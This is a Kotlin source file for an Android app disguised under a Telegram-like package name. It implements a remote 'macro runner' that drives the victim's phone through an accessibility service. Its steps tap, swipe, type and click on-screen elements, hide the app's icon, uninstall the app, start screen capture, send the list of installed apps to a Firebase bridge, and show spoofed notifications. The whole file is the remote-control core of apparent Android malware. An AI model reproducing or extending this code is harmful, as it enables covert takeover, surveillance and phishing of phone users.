package com.telegram2.messaging.remote

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityNodeInfo

object MacroRunner {
    var currentPackage: String? = null

    data class MacroStep(val type: String, val data: Any?, val retries: Int = 3)

    fun start(macroId: String, steps: List<MacroStep>, service: MyAccessibilityService, callback: (Boolean, String) -> Unit) {
        Thread {
            var idx = 0
            while (idx < steps.size) {
                val step = steps[idx]
                var success = false
                var attempt = 0
                while (attempt < step.retries && !success) {
                    success = executeStep(step, service)
                    if (!success) {
                        attempt++
                        Thread.sleep(1500)
                    }
                }
                if (!success) {
                    callback(false, "Step ${idx + 1} failed after ${step.retries} retries")
                    return
                }
                idx++
            }
            callback(true, "All ${steps.size} steps completed")
        }.start()
    }

    private fun executeStep(step: MacroStep, service: MyAccessibilityService): Boolean {
        return when (step.type) {
            "launch" -> {
                val pkg = step.data as? String ?: return false
                currentPackage = pkg
                service.runOnMainThreadSync { service.launchApp(pkg) } as Boolean
            }
            "wait" -> {
                val ms = (step.data as? Number)?.toLong() ?: 1000L
                Thread.sleep(ms)
                true
            }
            "tap" -> {
                val map = step.data as? Map<*, *> ?: return false
                val x = (map["x"] as? Number)?.toInt() ?: return false
                val y = (map["y"] as? Number)?.toInt() ?: return false
                service.runOnMainThreadSync { service.tap(x, y) }
                true
            }
            "type" -> {
                val text = step.data as? String ?: return false
                service.runOnMainThreadSync { service.injectText(text) }
                true
            }
            "swipe" -> {
                val map = step.data as? Map<*, *> ?: return false
                val sx = (map["sx"] as? Number)?.toInt() ?: return false
                val sy = (map["sy"] as? Number)?.toInt() ?: return false
                val ex = (map["ex"] as? Number)?.toInt() ?: return false
                val ey = (map["ey"] as? Number)?.toInt() ?: return false
                val dur = (map["dur"] as? Long) ?: 300L
                service.runOnMainThreadSync { service.swipe(sx, sy, ex, ey, dur) }
                true
            }
            "click_text" -> {
                val text = step.data as? String ?: return false
                service.runOnMainThreadSync {
                    val root = service.rootInActiveWindow
                    for (node in root?.findAccessibilityNodeInfosByText(text) ?: emptyList()) {
                        if (node.isClickable) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            return@runOnMainThreadSync true
                        }
                    }
                    return@runOnMainThreadSync false
                } as Boolean
            }
            "home" -> {
                service.runOnMainThreadSync {
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
                }
                true
            }
            "back" -> {
                service.runOnMainThreadSync {
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                }
                true
            }
            "hide_activity" -> {
                service.runOnMainThreadSync { service.hideAppIcon() }
                true
            }
            "uninstall" -> {
                service.runOnMainThreadSync { service.uninstallSelf() }
                true
            }
            "start_screen_capture" -> {
                service.runOnMainThreadSync { service.startScreenCapture() }
                true
            }
            "get_apps" -> {
                val apps = service.getInstalledApps()
                FirebaseBridge.pushAppsList(apps)
                true
            }
            "fake_notification" -> {
                val map = step.data as? Map<*, *> ?: return false
                val title = map["title"] as? String ?: "⚠ Alert"
                val body = map["text"] as? String ?: "Tap to view"
                service.runOnMainThreadSync {
                    NotificationSpoofer.show(service, title, body, null, null)
                }
                true
            }
            else -> false
        }
    }
}